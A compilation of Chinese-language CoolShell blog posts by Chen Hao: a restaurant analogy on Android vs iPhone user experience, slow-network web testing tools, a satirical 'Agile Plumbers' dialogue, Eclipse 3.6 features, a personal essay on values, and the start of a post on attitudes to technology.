（ **全文完，转载请注明作者和出处，请勿用于商业用途** ）# 食客还是大厨作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn****（请勿将本文用于商业用途，转载时注明作者和出处）****昨天我在文章《Android将允许纯C/C++开发应用》中发表了一些“很不中听”的观点，在我早晨上班刚打开电脑的时候，Gtalk上同学就发来了一条信息“android 为啥不用C/C++的原因是，android是开放式系统，为了能够跨平台。如果整回C/C++，那么windows mobile就是前车之鉴。”，于是和同学展了争论，同学的意思是Java是正确的，在硬件上的表现也将是很出色的，而且准入门槛低，最重要的是跨平台，跨平台是恶梦，而硬件上性能的问题在未来不是问题。iPhone是单一平台，所以不需要考虑跨平台。而在我的博文后面上也有许多的讨论，在CSDN上也有一些，大家可以去看看。 **很多朋友都谈了谈为什么Java要比C++要好的理由，很多很多，大家可以去看看，我觉得挺好的** 。不过后来，我更新了一下我的文章，留下了几个让大家思考的问题，我希望大家都看看。
在这里，我想和大家说说技术之上的东西。——————————————正文分割线——————————————在绝大多数的评论中，我看到了大家都是站在技术开发者的角度在讨论。我想这和Google的Android犯的是同一个毛病，那就是其注重了“程序员”，而不是“用户”。就像是，Unix是为程序员开发，Java 也是为程序员的跨平台难问题开发，而Windows是为用户开发，iPhone也是为用户开发。也许，我们认为，改进了程序员的开发体验后，能迸发出程序员强大的生产力，进而增加满足用户需求的能力。不过，我想说的是， **这件事的初衷是好的，但事实上程序员是永远不懂用户的** 。就像大家在讨论Android和Java的关系时，仅在谈跨平台，其实，跨平台关我最终用户屁事，开不开放并我最终用户P事。甚至，手机里装的是Linux还是Android还是Win Phone7还是Symbian，我做为一个用户我统统不关心，什么Java，还是C++，管我球事。作为一个程序员，如果你想不通这个观点的话，那你就去想想，你上饭馆点菜时，你会关心你点的菜是用什么样的锅碗瓢盆来盛，用什么样的燃料来做，什么样的刀来切，长在什么样的地，浇了什么样的肥……如果你还想不通的话，请看下面的例子：
有一天，Google告诉所有的大厨，从我们发布Android开始，你们做菜就简单了，这是一个跨平台的烧菜系统，以后，作为厨师的你，做菜再也不用关心是用炒锅，蒸锅，煮锅，砂锅，电饭锅，平底锅，也不用关心做的是西餐还是中餐，我们推出的“虚拟锅”将屏蔽这些硬件和技术细节，以后，你面对的只有一口锅。当然，对于这个虚拟锅，你需要使用一种新型的叫Java锅勺。Java锅勺是强大的，容易的。（然而，过了几年后，他们却推出了传统锅勺）对此，一堆大厨，吵啊吵啊的，大家都在争论锅的好坏。来饭馆吃饭的食客说，关我屁事，都麻利儿地赶快给我上菜！给我好吃的！（到这里，我希望你看懂了，如果你没有看懂的话，就此打住，后面的对你就太深了）当然，用户并不单单只是着迷于好吃的，还有好的服务和体验！程序员们管这个叫用户体验。不过，如果餐馆都关注大厨们做菜的体验了，很有可能会怠慢了用户体验。餐馆负责人吆喝着，我们的餐馆是跨平台的，是开放的，就是说，任何都可以在我们这里做吃的买给你。食客们说，什么？什么人都可以在你的餐馆里做菜？你搞错没有啊？！餐馆负责人说，这样我们可以吸引到更好的更优秀的大厨，能做出更优秀的菜，有的菜品还是其它餐馆提供的。食客们说，那可以试试。然后，当食客上桌的时候，他们发现不同的菜居然有不同的服务，而且点菜的流程也不一样，不过大家都号称自己有最好的用户体验和服务。此时，食客们反而犹豫了。而各位大厨在厨房津津乐道着自己的做菜体验，而没有挣到一分钱。餐馆负责人还继续向食们说：我们有四个订餐电话，不同的订餐电话可以订到不同的菜，以后这样的订餐电话会更多。
这个时候，一家叫iPhone的餐馆出现了，用户体验非常好，服务也很到位，食客们从入座点菜和进餐的过程都非常的流畅和风格统一，都相当的简单。食客们说，你们的这些菜品是怎么来的？iPhone餐厅负责人说，我们厨房对大厨们其实也是开放的，不过，厨房里的硬件和烹饪器具都是固定而不能修改的，而且，他们要想在这里做菜的话，每年得交给我们99美元的审核费用，我们严格他们的做菜工序，并保证用户的体验一致，我们的收入会和这些厨师分成，特别是那些有秘方的厨师将会分得更多。我们就像麦当劳一样，加盟我们的人有很多，不过我们所有店面的风格和用户点餐的过程完全一致，方便而服务优质。当然，我们的收费是高一点，但在我们这里不会出现任何的混乱。对于食客来说，虽然有人抱怨iPhone餐馆的只有一个服务生（单进程），但是，食客对该餐馆的服务表示很放心，体验也没得说，流畅完美简单一致。_**—–更新：2011/01/26—–**_跨不跨平台，开不开放，一点都不关用户的事，那是程序员的事。但用户的体验很关用户的事。 **用户的体验包括两方面，一方面是技术所带来的功能体验，另一方面是服务体验** 。Android和iPhone的差别是，Android只关注开发人员的体验和功能的体验，并没有服务的体验，而iPhone把功能和服务的体验都打包了。Android选择走什么样的路无所谓，要打赢这场战争，Android一定要学会从技术向服务的过渡，否则，就开发而言，也就是吸引一下程序员和产商罢了，其对用户没有任何吸引力。
但凡是走这条的，都很有问题（用户和服务跟不上，全部玩完，Linux的前期基本如此）* **产品 - > 开发人员 -> 产商 -> 用户 -> 服务**（???）而有些公司选择了这条路 （产品和服务先行，抢占用户市场相当快，比如Windows，IBM）* **产品 + 服务 - > 用户 -> 开发人员 + 运营代理**我不认为Apple的经验无法复制，而是这样的模式很多很多， **这个世界上有很多IT公司做到最后才发现，只有把产品和服务一同打包，才是用户想要的** 。——————————————————这就是Apple的简单之道，上述内容素材取材于我和我老婆的对话（我老婆是文科，对编程不懂，她正是我了解最终用户的对象，也是我锻炼沟通的对象）。下面是相关原始对话：**我** ：问个问题，如果有两家餐馆，你会先那家？* 第一家餐馆是开放的，怎么个开放呢？厨师可能是任何想做菜的人，有做的好的，也有做不好的。餐馆的厨房里的配置也是各式各样的，厨师甚至可以自带设备，反正，什么样的厨房用具都支持。另外，该餐馆有四个订餐电话，不过，不同的订餐电话都不一定都订到菜单上所有的菜，因为这个餐馆不但把厨房给开放出去了，订餐的方式也开放出去了。进餐体验方面，不同的分店有不同的样子。
* 第二家餐馆是封闭的，不过他也对外面的厨师开放，并和厨师一同分成。厨师里的用具是餐馆定制好的，厨师要做菜，必需先交100美金的审核费，餐馆派专人审核厨师做的每一道菜，包括工序。每个餐厅的环境非常友好，也很简单，而且能让人感到非常不错的进餐体验，所有的分店都是一样。订餐电话只有一个，可以完成一键订餐。当然，第二家店要贵点。**老婆** ：你说的第一家就是那种像“大食代”的各种小吃拼起来的地儿吧？第二家就是像麦当劳， 必胜客，或是一些正规地像“海底捞”、“江南春”这样的店吧。第一家的店么就是顺便吃吃，要真正吃东西，还是要去第二种店。老公，难得你今天请我吃饭，我看就吃你说的第二种吧。（我晕，又把自己给绕进去了）——————————————正文分割线——————————————P.S. 有的朋友说我是C/C++出生，就是看不起Java。这样说我太小看我了，我的文章风格从来都是以一种调侃的方式，因为我觉得这样的文章会比那些枯燥的技术文章更有意思。我调侃C++和程序员的文章不比调侃Java要少，我对C++的观点从来都是C++是一门很不成熟的半成品语言！Java则要比它成熟的多得多，不过Java的跨平台和性能上的确是有很多东西可以调侃。
**（请勿将本文用于商业用途，转载时注明作者和出处）**# 如何在低速率网络中测试 Web 应用作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn大家看到标题后的第一个问题可能是：“我们需要这样做吗？”如果我们开发的是局域网 Web 应用的话，可能没有必要这样做。但如果我们的 Web 应用面向的是互联网上的成千上万的用户，这样做就很必要了。因为在现实世界中并不是所有的用户都有高数率的网络连接，也许用户使用的是拨号接入，移动设备，3G，或者是 USB 网络加密狗。如果我们没有在低数率的网络环境中测试过我们 Web 应用，极有可能在上线后收到一些意想不到的关于系统性能方面的抱怨。这个时候无论我们的 Web 应用界面多么地 Web 2.0，功能多么地强大，对于用户来说都失去了使用价值。目前有很多工具能够模拟慢速网络，值得一提的是 Firefox Throttle，这是一个 Firefox 插件，你可以设置上载和下载的数率，并且监控当前带宽的使用情况。另一个非常有用的特性是它可以控制你的 localhost 的连接数率，对本地测试很有用。Firefox Throttle 的截图
另一个工具是 Sloppy，它是一个 Java Web Start application。_文章来源_# 敏捷水管工作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn本文来自Terazen Technology Inc的创始人+CTO的 David Ing的《Agile Plumbers》（这也墙？），我的其文中的这个帮事翻译过来（和前些天发的SOAP的S是Simple异曲同工）。也许你会觉得这个比喻不恰当。但我想告诉你的是，这个故事告诉我们，教条主义和以方法论为中心的危险。十条不错的编程观点中第一条—— **The only “best practice” you should be using all the time is “ Use Your Brain”.**————————————————————(门铃响……)**事主：** 啊, Agile 水管工吗？ 请进，感谢谢你们这么快就来了——这的确很紧急，我这真是很乱。**水管工1** : 先生，没问题，我们就是敏捷的。在我给你做Presentation前，我先给你介绍一下我的两个同事。
**事主** ：Presentation？啊，我们有时间吗？这的水已经流得到处都是了……**水管工1** ：……先生，我们必需坚持这个。我们只是想保证你能成为动态搜寻解决方法的一份子。你是我们的 champion sponsor，也就是我们团队内的 consultant！你可以提供一个白板给我们使用吗？**事主** ：我没听懂，你们不觉得这变复杂了吗？我觉得我应该告诉你们这水是从房子哪儿流出来的，就是那……**水管工2** ：你这有让我脱衣服的地儿吗？**事主** ：什么？**水管工2** ：我要坐在你的浴盆里——我还需要肥皂和托鞋。因为我们运作的方法是“测试驱动”， Red, Green, Red。你可以看到我们是怎么驱动的……**事主** ：为什么你会需要这样做？水都从楼梯上流下来了，水管爆裂了，马桶堵了，你能现在就开始吗？**水管工3** ：非常不错的feedback——感谢你！你介意先填一下这些 3×5 的卡片吗？我希望你能使用名词，让我们迭代一下刚才你说的“水灾……**水管工1** ：别那么着急，Domain Model 可以等的，让我们现在先生成一些想法——我们应该先把所有的业务需求都写出来，然后调查其动机。先生，是不是所有的功能都是 “关键业务’”？你能先给马桶评个等级吗？另外，如果你有100美金……
**事主** ：你在开玩笑吗？你看，如果你们不能干这个，那么我就……**水管工2** ：我去拿个扳手。**事主** ：好！终于！等等，你就拿来一个扳手？可是你们有三个人哦。**水管工** 1：不这样的，先生！我还是在这里做个初始的Presentation，我一会就走了。但是，我还是会对项目的进度非常感兴趣的。我会打电话过来参加明天的 stand-up meeting。**水管工2** ：另外，和你阐清一下，我们两个留下来的会分享同一把扳手，因为我们是结对水管工……**水管工3** ：……你能看到这会更有生产率，我们轮流使用这把扳手。并能保证很高的质量以及持续的工作激情！**事主** ：我没搞懂——你们以前应该就干过这个事了吗，不是吗？500美金的出场费还不能让你们有工作激情？**水管工1** ：你得想得长远一些，先生。你看，我们可以一起来经历整个过程。这是多么令人兴奋的事！我对此超级兴奋！**水管工** 2：哦，不。看看这个，这些是铜制的水管吗？有多少人在这住？**事主** ：什么？这个房子有5年了。就我和我太太在这里，但是你问这个是什么意思？**水管工3** ：嗯~~。我有些害怕，情况并没有那么简单！这些都是Legacy的水管，我们需要对它们做重构，而且，这些老的水管也无法适合我们新型的板手。重构看起来并不难……
**水管工2** ：喔，我们可以使用新的在机场使用的防水层系统。另外，还有更多的工作需要花在一个大的O型环性能配置上， 但是这会让住在这里的数千人都到影响。我想，我们得做个迭代……**事主** ：什么？？！！**水管工1** ：先生，也许我们可以从你这做一些case study。我们可以为这里创新。让我们先安排一个游戏，这样我们可以进行一个头脑风暴。而最简单有可能做的事——先生，你有水桶吗？**事主** ：够了！你们给我滚出去！真是荒唐——很明显，你们根本不知道你们在做什么。给我滚出去！**水管工** 1：先生，我开始怀疑你根本没有一个Fackbook社交平台策略（Facebook Social Platform Strategy）用来做解决方案？————————————————（全文完）# Eclipse 3.6 （Helios）新特性作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn2010年6月23日 Eclipse 3.6 Helios 正式发布，对 Java 程序员来说有哪些新特性值得关注？1、检查并报告是否有缺失的 @Override 注解，此功能仅对 Java 1.6 版本适用。在以前版本中，当我们为一个方法加上 @Override 注解，但是这个方法实际上并没有过载（override）任何父类的方法时，将会得到警告信息。在新版本中，如果我们忘记为一个过载方法加上 @Override 注解，同样也会得到警告信息。
2、变量视图中新增了一个列用于显示当前变量类型的实例数（Layout -> Select Column）。3、Java 视图中的包名称可以用自定义的规则来显示（Window –> Preferences –> Java –> Appearance）。4、用户可以选择在关闭 Eclipse 时不清除本地更改历史（local history），这样可以加快关闭的速度，但同时本地更改历史记录将会无限制地增大。5、查看实现代码（Open Implementation）。此功能在 Navigate 菜单中能够找到，目前没有缺省的快捷键，用户可以为其自定义一个（Windows –> Preferences –> General –> Keys）。例如，用户可以查看一个抽象方法的具体实现，如果有多个实现， Eclipse 会显示一个弹出窗口。6、虚拟文件夹（Virtual Folders）。用户可以在 workspace 中创建文件夹，这些文件夹只对 Eclipse 可见，对操作系统不可见。并且它们只能包含其他的虚拟文件夹和外部链接资源。7、安装配置比较（Compare Configurations）。通过此功能用户可以查看那些组件在哪一时间被安装，还可以选择卸载无用的安装以节省空间。
8、提供了对 JSF 2.0，Apache Tomcat 7，和 Aapache CXF 的支持，新增了 JAX-RS project facet。9、Eclipse 市场客户端（Eclipse Market Place Client）。在以前的版本中安装插件（plugins）一直都不能说是一件简单的事情，用户需要搜索相应的 update site URL。新版本引入了和 Apple 的应用商店类似的概念，用户可以在 Eclipse IDE 内搜索和安装插件了，此功能在 Help 菜单中可以找到。_文章来源一，文章来源二_# 谈谈我的“三观”作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn也许是人到了四十多了，敢写这么大的命题，我也醉了，不过，我还是想把我的想法记录下来，算是对我思考的一个snapshot，给未来的我看看，要么被未来的我打脸，要么打未来我的脸。无论怎么样，我觉得对我自己都很有意义。注意，这篇文章是长篇大论。三观是世界观、人生观和价值观，* **世界观代表你是怎么看这个世界的。** 是左还是右，是激进还是保守，是理想还是现实，是乐观还是悲观……   * **人生观代表你要想成为什么样的人。** 是成为有钱人，还是成为人生的体验者，是成为老师，还是成为行业专家，是成为有思想的人，还是成为有创造力的人……   * **价值观则是你觉得什么对你来说更重要** 。是名是利，是过程还是结果，是付出还是索取，是国家还是自己，是家庭还是职业……
人的三观其实是会变的，回顾一下我的过去，我感觉我的三观至少有这么几比较明显的变化，学生时代、刚走上社会的年轻时代，三十岁后的时代，还有现在。估计人都差不多吧……* 学生时代的三观更多的是学校给的，用各种标准答案给的，是又红又专的   * 刚走上社会后发现完全不是这么一回事，但学生时代的三观根深蒂固，三观开始分裂，内心开始挣扎   * 三十岁后，不如意的事越来越多，对社会越来越了解，有些人屈从现实，有些人不服输继续奋斗，而有些人展露才能开始影响社会，而分裂的三观开始收敛，我属于还在继续奋斗的人。   * 四十岁时，经历过的事太多，发现留给自己的时间不多，世界太复杂，而还有好多事没做，从而变得与世无争，也变得更为地自我。目录* 面对世界   * 面对社会   * 面对人生   * 价值取向#### 面对世界年轻的时候，抵制过日货，虽然没上过街，但是也激动过，一次是1999南斯拉夫大使馆被炸，一次是2005反日示威，以前，我也是一个爱国愤青。但是后来，有过各种机会出国长时间生活工作，加拿大、英国、美国、日本……随着自己的经历和眼界的开阔，自己的三观自己也随着有了很多的变化，发现有些事并不是自己一开始所认识的那样，而且还是截然相反的。 **我深深感觉到，要有一个好的世界观，你需要亲身去经历和体会这个世界，而不是听别人说** 。所以，当我看到身边的人情绪激动地要抵制这个国家，搞死那个民族的时候，我都会建议他去趟那个国家最好在在那个国家呆上一段时间，亲自感受一下。
再后来发现，要抵制的越来越多，小时候的美英帝国主义，然后是日本，再后面是法国、韩国、菲利宾、印度、德国、瑞典、加拿大……从小时候的台独到现在的港独、藏独、疆独……发现再这样下去，基本上来说，自己的人生也不用干别的事了……另外，随着自己的成长，越来越明白， **抵制这个抵制那个只不过是幼稚和狭隘的爱国主义，真想强国，想别让他人看得起，就应该把时间和精力放在努力学习放在精益求精上，做出比他们更好的东西来。** 另外，感觉用对内的爱国主义解决对外的外交问题也有点驴唇不对马嘴，无非也就是转移一下内部的注意力罢了，另外还发现爱国主义还可以成为消费营销手段…… **不是我不爱国，是我觉得世道变复杂了，我只是一个普通的老百姓，能力有限，请不要赋予我那么大的使命，我只想在我的专业上精进，能力所能及地帮助身边的人，过一个简单纯粹安静友善的生活** ……另外，为什么国与国之间硬要比个你高我低，硬要分个高下，硬要争出个输赢，我也不是太理解，世界都已经发展到全球化的阶段了，很多产品早就是你中有我，我中有你的情况了。举个例子，一部手机中的元件，可能来自全世界数十个国家，我们已经说不清楚一部手机是究竟是哪个国家生产的了。即然，整个世界都在以一种合作共赢全球化的姿态下运作，认准自己的位置，拥抱世界，持续向先进国家学习，互惠互利，不好吗？你可能会说，不是我们不想这样，是别人不容我们发展…… **老实说，大的层面我也感受不到，但就我在的互联网计算机行业方面，我觉得整个世界的开放性越来越好，开源项目空前地繁荣，世界上互联网文化也空前的开放，在计算机和互联网行业，我们享受了太多的开源和开放的红利，人家不开放，我们可能在很多领域还落后数十年。然而现在很多资源我们都访问不了，用个VPN也非法，你说是谁阻碍了发展？我只想能够流畅地访问互联网，让我的工作能够更有效率，然而，我在自己的家里却像做贼一样去学习新知识新技术，随时都有可能被抓进监狱……**
随着自己的经历越多，发现这个世界越复杂，也发现自己越渺小，很多国家大事并不是我不关心，是我觉得那根本不是我这个平头老百姓可以操心的事，这个世界有这个世界运作的规律和方法，而还有很多事情超出了我能理解的范围，也超出了我能控制的范围，我关心不关心都一个样，这些大事都不会由我的意志所决定的。而所谓的关心，无非就是喊喊口号，跟人争论一下，试图改变其它老百姓的想法，然而，对事情的本身的帮助却没有多大意义。过上几天，生活照旧，人家该搞你还不是继续搞你，而你自己并不因为做这些事而过得更好。**我对国与国之间的关系的态度是，有礼有节，不卑不亢，对待外国人，有礼貌但也要有节气，既不卑躬屈膝，也不趾高气昂** ，整体上，我并不觉得我们比国外有多差，但我也不觉得我们比国外有多好，我们还在成长，还需要帮助和协作，四海之内皆兄弟，无论在哪个国家，在老百姓的世界里，哪有那么多矛盾。 **有机会多出去走走，多结交几个其它民族的朋友，你会觉得，在友善和包容的环境下，你的心情和生活可以更好** 。我现在更多关心的是和我生活相关的东西，比如：上网、教育、医疗、食品、治安、税务、旅游、收入、物价、个人权益、个人隐私……这些东西对我的影响会更大一些，也更值得关注，可以看到过去的几十年，我们国家已经有了长足的进步，这点也让我让感到很开心和自豪的，在一些地方也不输别人。但是，依然有好些事的仍然没有达到我的预期，而且还很糟糕，这个也要承认。而对，未来的变数谁也不好说，我在这个国度里的安全感似乎还不足够，所以，我还是要继续努力，以便我可以有更多的选项。有选项总比没得选要好。所以， **我想尽一切办法，努力让选项多起来，无法改变无法影响，那就只能提高自己有可选择的可能性** 。
#### 面对社会另外，在网上与别人对一些事或观点的争论，我觉得越来越无聊，以前被怼了，一定要怼回去，现在不会了，视而不见，不是怕了，是因为，网络上的争论在我看来大多数都是些没有章法，逻辑混乱的争论。* 很多讨论不是说事，直接就是怼人骂人。随意就给人扣个帽子。   * 非黑即白的划分，你说这个不是黑的，他们就把你划到白的那边。   * 飘移观点，复杂化问题。东拉西扯，牵强附会，还扯出其它不相关的事来混淆。   * 杠精很多，不关心你的整体观点，抓住一个小辫子大作文章。很明显， **与其花时间教育这些人，不如花时间提升自己，让自己变得更优秀，这样就有更高的可能性去接触更聪明更成功更高层次的人** 。因为，一方面，你改变不了他们，另外，改变他们对你自己也没什么意义，改变自己，提升自己，让自己成长才有意义。时间是宝贵的，那些人根本不值得花时间，应该花时间去结交更有素质更聪明的人，做更有价值的事。美国总统富兰克林·罗斯福妻子埃莉诺·罗斯福（Eleanor Roosevelt）说过下面的一句话。> **Great minds discuss ideas;   >  Average minds discuss events;   >  Small minds discuss people**
把时间多放在一些想法上，对自己对社会都是有意义的，把时间放在八卦别人，说长到短，你也不可能改善自己的生活， **你批评这个批评那个，看不上这个看不起那个，不会让你有成长，也不会提升你的影响力，你的影响力不是你对别人说长道短的能力，而是别人信赖你并希望得到你的帮助的现象** 。多交一些有想法的朋友，多把自己的想法付诸实践，那怕没有成功，你的人生也会比别人过得有意义。如果你看过我以前的文章，你会看到一些吐槽性质的文章，而后面就再也没有了。另外，我也不再没有针对具体的某个人做出评价，因为人太复杂的了，经历的越多，你就会发现你很难评价人，与其花时间在评论人和事上，不如把时间花在做一些力所能及的事来改善自己或身边的环境。所以， **我建议大家少一些对人的指责和批评，通过对一件事来引发你的思考，想一想有什么可以改善，有什么方法可以做得更好，有哪些是自己可以添砖加瓦的？你会发现，只要你坚持这么做，你个人的提升和对社会的价值会越来越大，而你的影响力也会越来越大** 。#### 面对人生现在的我，即不是左派也不是右派，我不喜欢爱国主义，我也不喜欢崇洋媚外，我更多的时候是一个自由派，哪边我都不站，我站我自己。因为，生活在这样的一个时代，能让自己过好都是一些比较奢望的事了。
《教父》里有这样的人生观： **第一步要努力实现自我价值，第二步要全力照顾好家人，第三步要尽可能帮助善良的人，第四步为族群发声，第五步为国家争荣誉。事实上作为男人，前两步成功，人生已算得上圆满，做到第三步堪称伟大，而随意颠倒次序的那些人，一般不值得信任** 。这也是古人的“修身齐家治国平天下”！所以，在你我准备要开始要“平天下”的时候，也得先想想，自己的生活有没有过好了，家人照顾好了么，身边有哪些力所能及的事是可以去改善的……穷则独善其身，达则兼济天下。提升自己，实现自我，照顾好自己的家人，帮助身边的人。这已经很不错了！什么样的人干什么样的事，什么样的阶段做什么样的选择， **有人的说，选择比努力更重要的，我深以为然，而且，我觉得选择和决定，比努力更难** ，努力是认准了一个事后不停地发力，而决定要去认准哪个事是自己该坚持努力的，则是令人彷徨和焦虑的（半途而废的人也很多）。面对人生，你每天都在作一个一个的决定，在做一个又一个的选择，有的决定大，有的决定小，你的人生的轨迹就是被这一个一个的决定和选择所走走出来的。我在24岁放弃了一房子离开银行到小公司的时候，我就知道，人生的选择就是一个翘翘板，你要一头就没有另一头， **选择是有代价的，你不选择的代价更大；选择是要冒险的，你不敢冒险的风险更大；选择是需要放弃的，因为无论怎么选你都会要放弃。想想你老了以后，回头一看，好多事情在年轻的时候都不敢做，而你再也没有机会，你就知道不敢选择不敢冒险的代价有多大了。** 选择就是一种 trade-off，这世上根本不会有什么完美，只要你想做事，你有雄心壮志，你的人生就是一个坑接着一个坑，你所能做的就是找到你喜欢的方向跳坑。
所以， 你要想清楚你要什么，不要什么，而且还不能要得太多，这样你才好做选择。否则，你影响你的因子太多，决定不好做，也做不好。就像最前面说的一样，你是激进派还是保守派，你是喜欢领导还是喜欢跟从，你是注重长期还是注重短期，你是注重过程还是注重结果……等等，你对这些东西的坚持和守护，成为了你的“三观”，而你的三观则影响着你的选择，而你的选择影响着你的人生。#### 价值取向下面是一些大家经常在说，可能也是大多数人关心的问题，就这些问题，我也谈谈我的价值取向。**挣钱** 。挣钱是一个大家都想做的事，但你得解决一个很核心的问题，那就是为什么别人愿意给你钱？对于挣钱的价值观从我大学毕业到现我就没怎么变过，那就是我更多关注的是怎么提高自己的能力，让自己值那个价钱，让别人愿意付钱。另外一方面，我发现， **越是有能力的人，就越不计较一些短期得失，越计较短期得失的人往往都是很平庸的人** 。有能力的人不会关心自己的年终奖得拿多少，会不会晋升，他们更多的关心自己真正的实力有没有超过更多的人，更多的关注的是自己长远的成长，而不是一时的利益。聪明的人从来不关心眼前的得失，不会关心表面上的东西，他们更多关心的是长期利益，关心长期利益的人一定不是投机者，一定是投资者， **投资会把自己的时间精力金钱投资在能让自己成长和提升的地方，那些让自己可以操更大的盘的地方，他们培养自己的领导力和影响力。** 而投机者在职场上会通过溜须拍马讨好领导，在学习上追求速成，在投资上使用跟随策略，在创业上甚至会不择手段，当风险来临时，投机者是几乎完全没有抗风险能力的，他们所谓的能力只不过因为形势好。
**技术** 。对于计算机技术来说，要学的东西实在是太多，我并不害怕要学的东西很多，因为学习能力是一个好的工程师必需具备的事，我不惧怕困难和挑战。我觉得在语言和技术争论谁好谁坏是一种幼稚的表现， 没有完美的技术，Engineering 玩的是 Tradeoff。所以，我对没有完美的技术并不担心，但是我反而担心的是，当我们进入到一些公司后，这些公司会有一些技术上的沉淀也就是针对公司自己的专用技术，比如一些中间件，一些编程框架，lib库什么的。老实说，我比较害怕公司的专用技术，因为一旦失业，我建立在这些专用技术上的技能也会随之瓦解，有时候，我甚至害怕把我的技术建立在某一个平台上，小众的不用说了，大众的我也比较担扰，比如Windows或Unix/Linux上，因为一旦这个平台不流行或是被取代，那么我也会随之淘汰（过去的这20年已经发生过太多这样的事了）。为了应对这样的焦虑， **我更愿意花时间在技术的原理和技术的本质上，这导致我需要了解各种各样的技术的设计方法，以及内在原理。** 所以，当国内的绝大多数程序员们更多的关注架构性能的今天，我则花更多的时间去了解编程范式，代码重构，软件设计，计算机系统原理，领域设计，工程方法……因为只有原理、本质和设计思想才可能让我不会被绑在某个专用技术或平台上，除非，我们人类的计算机这条路没走对。
**职业** 。在过去20多年的职业生涯中，我从基层工程师做到管理，很多做技术的人都会转管理，但我却还是扎根技术，就算是在今天，还是会抠很多技术细节，包括写代码。因为我心里觉得，不写代码的人一定是做不好技术管理的，因为做技术管理有人要做技术决定，从不上手技术的人是做不好技术决定的，另一方面，我觉得管理是支持性的工作，不是产出性的工作，大多数的管理者无非是因为组织大了，所以需要管人管事，所以，必然要花大量的时间和精力处理各种问题，甚至办公室政治，然而，如果有一天失业了，大环境变得不好了，一个管理者和一个程序员要出去找工作，程序员会比管理者更能自食其力。所以，我并不觉得管理者这个职业有意思，我还是觉得程序员这个有创造性的职业更有趣。 **通常来说，管理者的技能力需要到公司和组织里才能展现，而有创造力的技能的人是可以自己独立的能力，所以，我觉得程序员的技能比管理者的技能能让我更稳定更自地活着** 。所以，我更喜欢“电影工作组”那样的团队和组织形式。**打工** 。对于打工，也就是加入一家公司工作，无论是在一家小公司还是一家大公司工作，都会有好的和不好的，任何公司都有其不完美的地方，这个需要承认。首先第一的肯定是完成公司交给你的任务（但我也不会是傻傻地完成工作，对于一些有问题的任务我也会提出我的看法），然后我会尽我所能在工作找到可以提高效率的地方进行改善。在推动公司/部门/团队在一技术和工程方面进步并不是一件很容易的事，因为进步是需要成本的，有时候，这种成本并不一定是公司和团队愿意接受的，而另外，从客观规律上来说，一件事的进步一定是会有和现状有一些摩擦的。有的人害怕有摩擦而忍了，而我则不是，我觉得与别人的摩擦并不可怕，因为大家的目标都是基本一致的，只是做事的标准和方式不一样，这是可能沟通的，始终是会相互理解的。而如果你没有去推动一个事，我觉得对于公司对于我个人来说，都是一种对人生的浪费，敬业也好，激情也好，其就是体现在你是否愿意冒险去推动一件于公于私都有利的事，而不是成为一个“听话”、“随大流”、“懒政”的人，即耽误了公司也耽误了自己。所以，我更信仰的是《做正确的事情，等着被开除》，这些东西，可参看《我看绩效考核》，以及我在Gitchat上的一些问答。
**创业** 。前两天，有个小伙来跟我说，说他要离开BAT要去创业公司了，说在那些更自由一些，没有大公司的种种问题。我毫不犹豫地教育了他一下，我说，你选择这个创业公司的动机不对啊，你无非就是在逃避一些东西罢了，你把创业公司当做是一个避风港，这是不对的，创业公司的问题可能会更多，去创业公司的更好的心态是，这个创业公司在干的事业是不是你的事业？说白了，如果你是为了你的事业，为了解决个什么，为了改进个什么，那么，创业是适合你的， **也只有在做自己事业的时候，你才能不惧困难，才会勇敢地面对一切** 。 **那种想找一个安稳的避风港呆着的心态是不会让你平静地，你要知道世界本来就是不平静的，找了自己的归宿和目标才可能让你真正的平静** 。所以，在我现的创业团队，我不要求大家加班，我也不鸡汤洗脑，对于想要加入的人，我会跟他讲我现在遇到的各种问题以及各种机遇，并一直在让他自己思考，我们在做的事是不是自己的事业诉求？还可不可以更好？ **每个人都应该为自己的事业为自己的理想去活一次，追逐自己的事业和理想并不容易，需要有很大的付出，而也只有你心底里的那个理想值得这么大的付出** ……**客户** 。基于上述的价值观，在我现在创业的时候，我在面对客户的时候，也是一样的，我并不会完全的迁就于客户，我的一些银行客户和互联网客户应该体会到我的做的方式了，我并不觉得迁就用户，用户要什么我就应该给什么，用户想听什么，我就说什么，虽然这样可以省着精力，更圆滑，但这都不是我喜欢的， **我更愿意鲜明地表达我的观点，并拉着用户跟我一起成长，因为我并不觉得完成客户的项目有成就感，我的成就感来自客户的成长** 。所以，面对客户有些做得不对有问题有隐患的地方，或是有什么做错的事，我基本上都是直言不讳地说出来，因为我觉得把真实的相法说出来是对客户和对自己最基本的尊重，不管客户最终的选择是什么，我都要把利弊跟客户讲清楚。我并不是在这里装，因为，我也想做一些更高级更有技术含量的事，所以，对于一些还达到的客户，我如果不把他们拉上来，我也对不起自己。
在我“不惑之年”形成了这些价值观体系，也许未来还会变，也许还不成熟，总之，我不愿跟大多数人一样，因为大多数人都是随遇而安随大流的，因为这样风险最小，而我想走一条属于自己的路，做真正的自己，就像我24岁从银行里出来时想的那样， **我选择对了一个正确的专业（计算机科学），呆在了一个正确的年代（信息化革命），这样的“狗屎运”几百年不遇，如果我还患得患失，那我岂不辜负活在这样一个刺激的时代？！我所要做的就是在这个时代中做有价值的事就好了！这个时代真的是太好了！**(全文完)# 对技术的态度作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn最近人品爆发，图灵社区，InfoQ，51CTO相继对我做了采访，前两天我把InfoQ对我的采访张贴了出来，今天，图灵社区和51CTO对我的采访发布了（图灵的访谈 ，51CTO的访谈），我是一个有技术焦虑症的人，我的经历比较特殊，对大家来说可能也没有什么意思，这两个采都有一些重叠的部分，不过有些观点我想再加强一些，并放在这里和大家一起分享一下。目录* 对于日新月异的新技术，你是什么态度？   * 可是在应用环境中，对新技术的需求是很高的，你觉得在教育领域计算机科学的侧重应该是什么样的？   * 那么，现在做一个软件开发者是否更加困难了？   * 你如何在进度压力下，享受技术带来的快乐？
